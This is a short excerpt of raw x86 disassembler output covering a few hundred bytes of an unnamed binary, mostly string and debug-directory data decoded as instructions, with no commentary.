  43492a:	add    BYTE PTR [edi+0x0],dl
  43492d:	xor    al,BYTE PTR [eax]
  43492f:	dec    edi
  434930:	add    BYTE PTR [edi+0x0],bl
  434933:	pop    edx
  434934:	add    BYTE PTR [eax],al
  434936:	add    BYTE PTR [eax+0x0],bl
  434939:	dec    esp
  43493a:	add    BYTE PTR [ecx],bh
  43493c:	add    BYTE PTR [edi+0x0],bl
  43493f:	dec    ebx
  434940:	add    BYTE PTR [ecx+0x0],al
  434943:	dec    edx
  434944:	add    BYTE PTR [esi+0x0],al
  434947:	xor    DWORD PTR [eax],eax
  434949:	xor    al,0x0
  43494b:	pop    edi
  43494c:	add    BYTE PTR [eax+0x0],bl
  43494f:	inc    edi
  434950:	add    BYTE PTR [edx+0x0],al
  434953:	add    BYTE PTR [eax],al
  434955:	push   eax
  434956:	add    BYTE PTR [ebx],dh
  434958:	add    BYTE PTR [esi+0x0],cl
  43495b:	pop    edi
  43495c:	add    BYTE PTR [eax+0x0],cl
  43495f:	xor    eax,0x5f005300
  434964:	add    BYTE PTR [eax+0x0],cl
  434967:	add    BYTE PTR [eax],al
  434969:	dec    ebp
  43496a:	add    BYTE PTR [eax],dh
  43496c:	add    BYTE PTR [edx+0x0],al
  43496f:	pop    edi
  434970:	add    BYTE PTR [edx+0x0],cl
  434973:	pop    eax
  434974:	add    BYTE PTR [eax+eax*1+0x49],dl
  434978:	add    BYTE PTR [eax+eax*1+0x39],cl
  43497c:	add    BYTE PTR [eax+eax*1+0x0],cl
  434980:	add    BYTE PTR [ecx+0x0],al
  434983:	xor    eax,DWORD PTR [eax]
  434985:	xor    BYTE PTR [eax],al
  434987:	pop    edi
  434988:	add    BYTE PTR [ecx+0x0],al
  43498b:	pop    edx
  43498c:	add    BYTE PTR [ecx+0x0],dl
  43498f:	pop    edx
  434990:	add    BYTE PTR [ecx],bh
  434992:	add    BYTE PTR [esi],dh
  434994:	add    BYTE PTR [edi+0x0],bl
  434997:	dec    eax
  434998:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43499c:	add    BYTE PTR [eax],al
  43499e:	add    BYTE PTR [ecx+0x0],dl
  4349a1:	push   edi
  4349a2:	add    BYTE PTR [ecx+0x0],bl
  4349a5:	pop    edi
  4349a6:	add    BYTE PTR [esi+0x0],dl
  4349a9:	xor    al,0x0
  4349ab:	inc    esp
  4349ac:	add    BYTE PTR [ecx],dh
  4349ae:	add    BYTE PTR [eax],bh
  4349b0:	add    BYTE PTR [edx],dh
  4349b2:	add    BYTE PTR [edi+0x0],bl
  4349b5:	cmp    DWORD PTR [eax],eax
  4349b7:	push   esp
  4349b8:	add    BYTE PTR [eax+eax*1+0x0],dl
  4349bc:	add    BYTE PTR [esi+0x0],dl
  4349bf:	dec    edi
  4349c0:	add    BYTE PTR [edi+0x0],al
  4349c3:	add    BYTE PTR ss:[edi+0x0],bl
  4349c7:	dec    edi
  4349c8:	add    BYTE PTR [edx+0x0],bl
  4349cb:	inc    ebp
  4349cc:	add    BYTE PTR [eax],dh
  4349ce:	add    BYTE PTR [ebp+0x0],al
  4349d1:	xor    BYTE PTR [eax],al
  4349d3:	pop    edi
  4349d4:	add    BYTE PTR [eax],dh
  4349d6:	add    BYTE PTR ds:0x4f000000,dh
  4349dc:	add    BYTE PTR ds:0x5f005700,dh
  4349e2:	add    BYTE PTR [edi],dh
  4349e4:	add    BYTE PTR [ebx+0x0],dl
  4349e7:	push   ebp
  4349e8:	add    BYTE PTR [edi+0x0],al
  4349eb:	xor    al,0x0
  4349ed:	pop    edi
  4349ee:	add    BYTE PTR [ecx+0x0],dl
  4349f1:	inc    esp
  4349f2:	add    BYTE PTR [eax],al
  4349f4:	add    BYTE PTR [edx+0x0],dl
  4349f7:	push   esp
  4349f8:	add    BYTE PTR ds:0x52005f00,dh
  4349fe:	add    BYTE PTR [edi+0x0],dl
  434a01:	xor    al,BYTE PTR [eax]
  434a03:	xor    al,BYTE PTR [eax]
  434a05:	xor    BYTE PTR [eax],al
  434a07:	xor    BYTE PTR [eax],al
  434a09:	pop    edi
  434a0a:	add    BYTE PTR [esi],dh
  434a0c:	add    BYTE PTR [eax],al
  434a0e:	add    BYTE PTR [eax+0x0],cl
  434a11:	inc    ebp
  434a12:	add    BYTE PTR [eax+eax*1+0x30],cl
  434a16:	add    BYTE PTR [edi+0x0],bl
  434a19:	dec    edx
  434a1a:	add    BYTE PTR [edx],dh
  434a1c:	add    BYTE PTR [edi],dh
  434a1e:	add    BYTE PTR [ebp+0x0],dl
  434a21:	add    BYTE PTR ss:[eax],dh
  434a24:	add    BYTE PTR [eax],al
  434a26:	add    BYTE PTR [esi+0x0],dl
  434a29:	cmp    BYTE PTR [eax],al
  434a2b:	dec    edi
  434a2c:	add    BYTE PTR [ecx],bh
  434a2e:	add    BYTE PTR [edi+0x0],bl
  434a31:	pop    eax
  434a32:	add    BYTE PTR [edx+0x0],bl
  434a35:	dec    esp
  434a36:	add    BYTE PTR [ebx+0x0],cl
  434a39:	add    BYTE PTR [eax],al
  434a3b:	dec    ecx
  434a3c:	add    BYTE PTR [ebp+0x0],dl
  434a3f:	dec    edi
  434a40:	add    BYTE PTR [eax],al
  434a42:	add    BYTE PTR [edx+0x53],dl
  434a45:	inc    esp
  434a46:	push   ebx
  434a47:	loopne 0x434a0e
  434a49:	sbb    eax,0xfbd73ae7
  434a4e:	inc    edx
  434a4f:	scas   eax,DWORD PTR es:[edi]
  434a50:	adc    BYTE PTR [eax+0x5e441027],bl
  434a56:	add    eax,0x1a
  434a5b:	push   ebx
  434a5c:	cmp    bl,BYTE PTR [ecx+eiz*2+0x76]
  434a60:	jne    0x434adb
  434a62:	ins    DWORD PTR es:[edi],dx
  434a63:	dec    ecx
  434a64:	jb     0x434ae0
  434a66:	pop    esp
  434a67:	bound  di,DWORD PTR [edx+0x52]
  434a6b:	gs fs push ax
  434a6f:	arpl   WORD PTR [esi+0x5c],si
  434a72:	js     0x434ace
  434a74:	je     0x434abd
  434a76:	jno    0x434aba
  434a78:	jno    0x434ae1
  434a7a:	bound  ebp,QWORD PTR [esi]
  434a7c:	jo     0x434ae2
  434a7e:	bound  eax,QWORD PTR [eax]
	...
